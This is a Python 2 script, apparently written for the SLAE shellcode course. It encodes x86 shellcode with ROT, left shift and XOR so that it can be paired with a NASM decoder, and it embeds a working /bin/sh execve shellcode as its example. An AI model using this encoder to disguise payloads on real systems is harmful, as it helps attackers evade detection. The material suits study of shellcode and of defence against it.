#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Script        = Encoder.py                                                                  #
# SLAE-ID       = SLAE-1115                                                                   #
# Description   = [ROT-N + SHL-N + XOR-N] Encoder                                             #
# Date          = 1/19/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python Encoder.py <ROT number> <number of bits to shift> <XOR number>       #
#---------------------------------------------------------------------------------------------#

import sys

# Colors 
#---------------#---------#
W  = '\033[0m'  # White   #
P  = '\033[35m' # Purple  #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

# Check ROT, SHL, and XOR input, otherwise print usage, example, and important notes!
if len(sys.argv) < 4:
  print Y+ "Usage               :" + P+  " python Encoder.py <ROT number> <number of bits to shift> <XOR number>  " +W
  print Y+ "Example             :" + P+  " python Encoder.py 13 1 1337                                            " +W
  print Y+ "Notes               :" + P+  " 1) Make sure to update Decoder.nasm with input values.                 " +W
  print    "                     " + P+  " 2) Due to encoded_shellcode size (word) in Decoder.nasm, shift operatio" +W
  print    "                     " + P+  "    n is limited to <1-8> bits. Feel free to upgrade size to DW to allow" +W
  print    "                     " + P+  "    up to 16-bits shift operation.                                      " +W
  print    "                     " + P+  " 3) Encoder.py currently include /bin/sh shellcode as proof of concept. " +W
  print    "                     " + P+  "    Make sure to change it to your desired shellcode.                   " +W
  sys.exit(0)

ROT     = int(sys.argv[1])
nbits   = int(sys.argv[2])
XOR     = int(sys.argv[3])

# initial values   
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80")           # paste your shellcode here
XOR_HEX = hex(XOR)                                                                                     # Encoded shellcode terminator     
encoded_shellcode  = "" 
original_shellcode = ""

# Orginal shellcode formatted
for x in bytearray(shellcode):
  original_shellcode += '0x'
  original_shellcode += '%02x, ' %x

# [ROT-N + SHL-N + XOR-N] encoded shellcode formatted   
for y in bytearray(shellcode):  
  byte = (y + ROT)%256                                                                                  #|-->ROT-N               
  byte = byte << nbits                                                                                  #########|-->SHL-N
  byte = byte ^ XOR                                                                                     #################|-->XOR-N	                                                                                  
  encoded_shellcode += '0x'
  encoded_shellcode += '%02x, ' %byte

# print original and encoded shellcode
print Y+ "Original Shellcode: " + P+ original_shellcode              +W
print Y+ "Encoded Shellcode : " + P+ encoded_shellcode  + Y+ XOR_HEX +W
